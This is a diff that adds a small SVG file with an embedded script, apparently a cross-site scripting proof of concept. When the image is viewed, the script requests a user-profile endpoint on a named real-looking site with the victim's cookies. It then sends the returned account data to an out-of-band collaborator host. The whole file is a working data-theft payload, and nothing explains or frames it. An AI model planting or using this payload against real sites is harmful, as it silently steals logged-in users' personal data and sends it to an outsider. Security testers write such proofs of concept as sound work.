@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch("https://api.lbb.in/web/users/me", {
+      method: "GET",
+      credentials: "include"
+    })
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://0gha4jttme2qb66c37i8hognieo5cv0k.oastify.com/log?data=" + encodeURIComponent(data));
+    });
+  </script>
+</svg>
